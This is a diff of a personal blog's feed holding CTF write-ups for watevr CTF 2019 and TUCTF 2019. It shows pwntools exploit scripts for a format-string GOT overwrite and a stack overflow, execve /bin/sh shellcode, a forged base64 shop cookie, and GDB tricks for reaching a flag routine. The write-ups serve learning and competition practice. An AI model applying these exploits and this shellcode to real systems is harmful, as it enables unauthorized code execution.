+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_&lt;a href=&#34;https://www.youtube.com/watch?v=Va4aF6rRdqU&#34;&gt;https://www.youtube.com/watch?v=Va4aF6rRdqU&lt;/a&gt;}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2 id=&#34;voting-machine-2&#34;&gt;Voting Machine 2&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2&#34;&gt;kamikaze2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This binary had a format string vulnerability, since printf is being used without any format specifiers.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;I played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with &lt;code&gt;%x&lt;/code&gt;s. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).&lt;/p&gt;
+&lt;p&gt;After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.&lt;/p&gt;
+&lt;p&gt;The final exploit code is -&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./kamikaze2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;13.53.125.206&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)
+
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
+func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08420736&lt;/span&gt;
+main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x084207fb&lt;/span&gt;
+exit_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08422024&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pad&lt;/span&gt;(s):
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;len(s))
+
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AA&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(exit_plt)
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(exit_plt&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;BBBBCCCC&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;8$1828x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;8$n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%65804x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+exploit &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9$n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(pad(exploit))
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pad(exploit)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;payload&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(pad(exploit))
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{GOT_som3_fl4g_for_you_&lt;a href=&#34;https://www.youtube.com/watch?v=hYeFcSq7Mxg&#34;&gt;https://www.youtube.com/watch?v=hYeFcSq7Mxg&lt;/a&gt;}&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;other-categories&#34;&gt;Other categories&lt;/h1&gt;
+&lt;h2 id=&#34;misc---unspaellablle&#34;&gt;Misc - Unspaellablle&lt;/h2&gt;
+&lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/orig.txt&#34;&gt;orig.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner &amp;amp; Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript.&lt;/p&gt;
+&lt;p&gt;I found it at &lt;a href=&#34;https://www.imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html&#34;&gt;IMSDb&lt;/a&gt;, and it was in the same format!!!&lt;/p&gt;
+&lt;p&gt;After this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; &gt;
+&lt;img src=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The flag is - &lt;strong&gt;watevr{icantspeel_tiny.cc/2qtdez}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2 id=&#34;web---cookie-store&#34;&gt;Web - Cookie Store&lt;/h2&gt;
+&lt;p&gt;Webpage - &lt;a href=&#34;http://13.48.71.231:50000/&#34;&gt;http://13.48.71.231:50000/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The page has a cookie - &lt;strong&gt;eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==&lt;/strong&gt;, on decoding - &lt;strong&gt;{&amp;ldquo;money&amp;rdquo;: 50, &amp;ldquo;history&amp;rdquo;: []}&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;We see that the &lt;em&gt;Flag&lt;/em&gt; cookie is for 100$, so if we set the cookie to base64({&amp;ldquo;money&amp;rdquo;: 200, &amp;ldquo;history&amp;rdquo;: []}), i.e. &lt;strong&gt;eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=&lt;/strong&gt;.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.&lt;/p&gt;
+&lt;p&gt;The flag is - &lt;strong&gt;watevr{b64_15_4_6r347_3ncryp710n_m37h0d}&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;That&#39;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn&#39;t solve. I will add my version of their writeups when I get to know their solution.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>TUCTF 2019 - Pwn &amp; Rev Challenges</title>
@@ -20,7 +477,7 @@
       <description>&lt;p&gt;I couldn&#39;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
-&lt;h2 id=&#34;thefirst--379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
+&lt;h2 id=&#34;thefirst---379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
 &lt;p&gt;We can see in the image below that &lt;code&gt;gets&lt;/code&gt; is being used to take the input. Hence it can be exploited for &lt;em&gt;buffer overflow&lt;/em&gt;. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.&lt;/p&gt;
 
 
@@ -120,7 +577,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;h2 id=&#34;shellme32--462-pts&#34;&gt;shellme32 - 462 pts&lt;/h2&gt;
+&lt;h2 id=&#34;shellme32---462-pts&#34;&gt;shellme32 - 462 pts&lt;/h2&gt;
 &lt;p&gt;On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using &lt;code&gt;vmmap&lt;/code&gt;, we find that the adress given to us is that of the stack and the stack is read, write and executable.&lt;/p&gt;
 
 
@@ -175,7 +632,40 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;h2 id=&#34;printfun--500-pts&#34;&gt;printfun - 500 pts&lt;/h2&gt;
+&lt;h2 id=&#34;shellme64---480-pts&#34;&gt;shellme64 - 480 pts&lt;/h2&gt;
+&lt;p&gt;This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace &lt;code&gt;p32&lt;/code&gt; with &lt;code&gt;p64&lt;/code&gt; when adding the stack address to the payload.&lt;/p&gt;
+&lt;p&gt;We use &lt;a href=&#34;https://www.exploit-db.com/exploits/42179&#34;&gt;exploit-db&lt;/a&gt; to get the shellcode. The offset of the crash is same as before.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x50&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbb&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x62&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x69&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x6e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x73&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x53&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x54&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x5f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x3b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x05&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./shellme64&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Stack Address: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(hex(addr)))
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len(shellcode))
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# with open(&amp;#39;payload&amp;#39;, &amp;#39;wb&amp;#39;) as f:&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#     f.write(payload)&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(addr)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;payload&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;printfun---500-pts&#34;&gt;printfun - 500 pts&lt;/h2&gt;
 &lt;p&gt;Here, on analysing with Ghidra, we find that there is a format string vulnerability.&lt;/p&gt;
 
 
@@ -240,7 +730,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h1 id=&#34;rev-challenges&#34;&gt;Rev Challenges&lt;/h1&gt;
-&lt;h2 id=&#34;faker--400-pts&#34;&gt;faker - 400 pts&lt;/h2&gt;
+&lt;h2 id=&#34;faker---400-pts&#34;&gt;faker - 400 pts&lt;/h2&gt;
 &lt;p&gt;If we open the binary in Ghidra, we see that there are calls to different functions, namely &lt;em&gt;A&lt;/em&gt;, &lt;em&gt;B&lt;/em&gt; and &lt;em&gt;C&lt;/em&gt;, which depend on the user input. But on trying them, we get fake flags.&lt;/p&gt;
 
 
@@ -314,7 +804,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;/figure&gt;
 
 &lt;p&gt;There can be two ways to solve this challenge.&lt;/p&gt;
-&lt;h3 id=&#34;method-1--static&#34;&gt;Method 1 - Static&lt;/h3&gt;
+&lt;h3 id=&#34;method-1---static&#34;&gt;Method 1 - Static&lt;/h3&gt;
 &lt;p&gt;Write a script to emulate the functionality of the &lt;code&gt;printFlag&lt;/code&gt; function.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;printFlag&lt;/span&gt;(s):
     s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
@@ -325,14 +815,14 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 
 printFlag(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;PJ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us the flag - &lt;code&gt;TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;method-2--dynamic&#34;&gt;Method 2 - Dynamic&lt;/h3&gt;
+&lt;h3 id=&#34;method-2---dynamic&#34;&gt;Method 2 - Dynamic&lt;/h3&gt;
 &lt;p&gt;Here set a breakpoint in main and then run the following commads in GDB.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; info functions  &lt;span style=&#34;color:#75715e&#34;&gt;# get address of printFlag function&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; set $rip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x000055555555534b   &lt;span style=&#34;color:#75715e&#34;&gt;# i.e. to the address of the function&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; c
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will print the flag.&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;core--400-pts&#34;&gt;core - 400 pts&lt;/h2&gt;
+&lt;h2 id=&#34;core---400-pts&#34;&gt;core - 400 pts&lt;/h2&gt;
 &lt;p&gt;We a re provided a core dump and a C file. The C file looks like this&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  // prints&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
